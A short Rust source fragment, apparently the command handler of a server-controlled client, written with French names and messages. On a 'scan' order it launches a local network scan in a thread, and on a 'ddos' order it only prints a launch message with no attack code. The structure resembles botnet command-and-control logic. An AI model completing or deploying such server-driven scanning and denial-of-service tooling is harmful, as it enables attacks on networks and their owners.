
use std::thread;
use std::thread::JoinHandle;

mod scan;

use std::borrow::Cow;


pub(crate) fn ordre_du_srv(mut ordre: String) {

    if ordre == "scan" {

        println!("Lancement du Scan réseau");
        let t = thread::spawn(move|| { scan::scan(scan::find_net()); });

    }else if ordre == "ddos" {

        println!("lancement ddos");

    }else {
        println!("pass")
    }

}
